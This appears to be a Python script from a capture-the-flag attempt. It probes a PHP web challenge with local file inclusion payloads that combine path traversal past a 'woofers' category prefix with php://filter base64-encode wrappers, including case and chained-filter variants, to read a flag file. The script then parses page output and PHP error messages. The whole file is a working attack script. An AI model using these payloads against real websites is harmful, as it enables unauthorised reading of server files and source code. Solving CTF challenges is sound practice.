"""Round 3: once more with php://filter smuggled behind the woofers prefix."""
import re
import urllib.parse
import urllib.request

BASE = "http://noctf.fa1lsnow.com:40547/index.php?category="

PAYLOADS = [
    "woofers/../flag",                                              # control
    "woofers/../php://filter/convert.base64-encode/resource=flag",  # key attempt
    "woofers/../php://filter/convert.base64-encode/resource=/var/www/html/flag",
    "woofers/../php://filter/read=convert.base64-encode/resource=flag",
    "woofers/../PHP://filter/convert.base64-encode/resource=flag",
    "woofers/../php://filter/convert.base64-encode|convert.base64-encode/resource=flag",
]


def fetch(cat):
    url = BASE + urllib.parse.quote(cat, safe="/%:")
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e)


for p in PAYLOADS:
    status, body = fetch(p)
    note = ""
    if isinstance(body, str):
        m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
        if m:
            note = re.sub(r"\s+", " ", m.group(1)).strip()[:300]
        if "Warning" in body:
            wm = re.search(r"(Warning|Fatal error)[^<]{0,250}", body)
            note += " [PHPERR: " + (wm.group(0) if wm else "?") + "]"
    print(f"[{status}] {p!r}\n      {note}\n")
